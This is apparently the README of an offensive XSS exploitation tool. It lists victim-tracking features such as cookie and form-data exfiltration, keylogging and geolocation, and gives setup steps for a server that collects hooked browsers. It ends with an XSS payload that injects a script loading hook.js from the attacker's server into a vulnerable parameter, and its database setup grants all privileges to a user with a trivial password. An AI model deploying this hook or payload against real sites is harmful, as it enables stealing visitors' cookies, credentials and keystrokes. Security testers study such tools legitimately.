XSS Exploitation Tool is a penetration testing tool that focuses on the exploit of Cross-Site Scripting vulnerabilities.

> This tool is only for educational purpose, do not use it against real environment

# Features

- Technical Data about victim browser
- Geolocation of the victim
- Snapshot of the hooked/visited page
- Source code of the hooked/visited page
- Exfiltrate input field data
- Exfiltrate cookies
- Keylogging
- Display alert box
- Redirect user

# Installation

## Installing on host

> Tested on Debian 12

You may need Apache, Mysql database and PHP with modules:

```
$ sudo apt-get install apache2 default-mysql-server php php-mysql php-curl php-dom
$ sudo rm /var/www/index.html
```

Install Git and pull the XSS-Exploitation-Tool source code:

```
$ sudo apt-get install git

$ cd /tmp
$ git clone https://github.com/Sharpforce/XSS-Exploitation-Tool.git
$ sudo mv XSS-Exploitation-Tool/* /var/www/html/
```

Install composer, then install the application dependencies:

```
$ sudo apt-get install composer
$ cd /var/www/html/
$ sudo chown -R $your_debian_user:$your_debian_user /var/www/
$ composer install
$ sudo chown -R www-data:$www-data /var/www/
```

### Init the database

```
$ sudo mysql
```

Creating a new user with specific rights:

```
MariaDB [(none)]> grant all on *.* to xet@localhost identified by 'xet';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> quit
Bye
```

Creating the database (will result in an empty page):

Visit the page http://server-ip/reset_database.php

### Adapt the javascript hook file

The file hook.js is a hook. You need to replace the ip address in the first line with the XSS Exploitation Tool server ip address:

```javascript
var address = "your server ip";
```

## Using Docker

Adapt the hook.js file as explained above before building the image.

Build the image:
```
$ docker-compose -f docker-compose.yml build
```

Adapt environment variables in docker-compose.yml file and run the tool:
```
$ docker-compose -f docker-compose.yml up
```

This will spin up the server and the database, visit the page http://localhost:8080 to see the XSS Exploitation Tool interface.

NOTE: A default user for mysql is created with the credentials in the docker-compose.yml.

# How it works

First, create a page (or exploit a Cross-Site Scripting vulnerability) to insert the Javascript hook file (see exploit.html at the root dir):

```
?vulnerable_param=<script src="http://your_server_ip/hook.js"/>
```

Then, when victims visit the hooked page, the XSS Exploitation Tool server should list the hooked browsers:
